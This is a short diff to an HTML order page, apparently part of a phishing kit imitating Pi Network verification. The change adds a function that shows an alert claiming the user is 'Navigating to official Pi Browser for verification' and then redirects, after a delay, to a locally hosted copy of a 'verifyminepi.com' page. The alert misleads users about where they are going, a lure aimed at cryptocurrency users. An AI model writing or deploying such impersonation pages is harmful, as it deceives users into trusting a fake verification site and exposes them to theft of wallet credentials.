@@ -23,7 +23,7 @@
             <input type="text" id="name" name="name">
 
             <button type="submit" id="submit-btn">Submit Order</button>
-            <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Verification</button>
+            <button onclick="verifyAndNavigate()">Verification</button>
             <button onclick="goBack()">Go Back</button>
         </form>
     </div>
@@ -49,13 +49,15 @@
                 }
                 document.getElementById("submit-btn").innerText = "Submitted"; // Change button text to "Submitted"
                 // return response.text(); // No need for response text handling
-            })
-         
+            });
         });
 
-        // JavaScript function to navigate to a page
-        function navigateTo(page) {
-            window.location.href = page;
+        // JavaScript function to verify and navigate
+        function verifyAndNavigate() {
+            alert("Navigating to official Pi Browser for verification...");
+            setTimeout(function() {
+                window.location.href = 'vent/verifyminepi.com/verifyminepi/verify/ventindex.html';
+            }, 2000); // Change time delay as needed
         }
 
         // JavaScript function to go back in history
